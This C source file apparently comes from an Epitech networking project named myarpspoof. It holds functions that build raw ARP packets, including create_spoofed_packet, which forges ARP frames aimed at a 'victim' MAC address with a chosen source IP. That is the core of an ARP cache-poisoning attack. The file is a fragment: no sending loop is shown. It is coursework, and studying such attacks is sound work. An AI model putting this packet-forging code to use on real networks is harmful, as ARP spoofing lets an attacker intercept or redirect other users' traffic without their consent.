/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by lucasg,
*/

#include "arp.h"

char *create_sendable_packet(arp_hdr_t *arp_hdr,
    struct sockaddr_ll *arp_sockaddr, params_t *params)
{
    char *packet = malloc(sizeof(char) * PACKET_LEN);
    struct ethhdr *eth_header = (struct ethhdr *) packet;
    arp_hdr_t *arp_header = (arp_hdr_t *) (packet + ETHHDR_LEN);
    uint32_t target_ip = inet_addr(params->dest_ip);
    uint32_t source_ip = inet_addr(params->source_ip);

    memset(eth_header->h_dest, 0xff, MACADDR_LEN);
    memset(arp_header->target_mac, 0xff, MACADDR_LEN);
    memcpy(eth_header->h_source, arp_hdr->source_mac, MACADDR_LEN);
    memcpy(arp_header->source_mac, arp_hdr->source_mac, MACADDR_LEN);
    memcpy(arp_sockaddr->sll_addr, arp_hdr->source_mac, MACADDR_LEN);
    eth_header->h_proto = htons(ETH_P_ARP);
    arp_header->hardware_type = arp_hdr->hardware_type;
    arp_header->hardware_len = arp_hdr->hardware_len;
    arp_header->protocol_type = arp_hdr->protocol_type;
    arp_header->protocol_len = arp_hdr->protocol_len;
    arp_header->opcode = arp_hdr->opcode;
    memcpy(arp_header->source_ip, &source_ip, sizeof(uint32_t));
    memcpy(arp_header->target_ip, &target_ip, sizeof(uint32_t));
    return packet;
}

void convert_victim_mac_addr(char *victim_addr,
    struct ethhdr *ethhdr, arp_hdr_t *arp_hdr)
{
    char victim[6] = {
            hexadecimal_to_decimal(getnbr(&victim_addr[0])),
            hexadecimal_to_decimal(getnbr(&victim_addr[3])),
            hexadecimal_to_decimal(getnbr(&victim_addr[6])),
            hexadecimal_to_decimal(getnbr(&victim_addr[9])),
            hexadecimal_to_decimal(getnbr(&victim_addr[12])),
            hexadecimal_to_decimal(getnbr(&victim_addr[15]))
    };

    memcpy(ethhdr->h_dest, victim, MACADDR_LEN);
    memcpy(arp_hdr->target_mac, victim, MACADDR_LEN);
}

char *create_spoofed_packet(arp_hdr_t *arp_hdr,
    struct sockaddr_ll *arp_sockaddr, params_t *params, char *victim_addr)
{
    char *packet = malloc(sizeof(char) * PACKET_LEN);
    struct ethhdr *eth_header = (struct ethhdr *) packet;
    arp_hdr_t *arp_header = (arp_hdr_t *) (packet + ETHHDR_LEN);
    uint32_t target_ip = inet_addr(params->dest_ip);
    uint32_t source_ip = inet_addr(params->source_ip);

    convert_victim_mac_addr(victim_addr, eth_header, arp_header);
    memcpy(eth_header->h_source, arp_hdr->source_mac, MACADDR_LEN);
    memcpy(arp_header->source_mac, arp_hdr->source_mac, MACADDR_LEN);
    memcpy(arp_sockaddr->sll_addr, arp_hdr->source_mac, MACADDR_LEN);
    eth_header->h_proto = htons(ETH_P_ARP);
    arp_header->hardware_type = arp_hdr->hardware_type;
    arp_header->hardware_len = arp_hdr->hardware_len;
    arp_header->protocol_type = arp_hdr->protocol_type;
    arp_header->protocol_len = arp_hdr->protocol_len;
    arp_header->opcode = arp_hdr->opcode;
    memcpy(arp_header->source_ip, &source_ip, sizeof(uint32_t));
    memcpy(arp_header->target_ip, &target_ip, sizeof(uint32_t));
    return packet;
}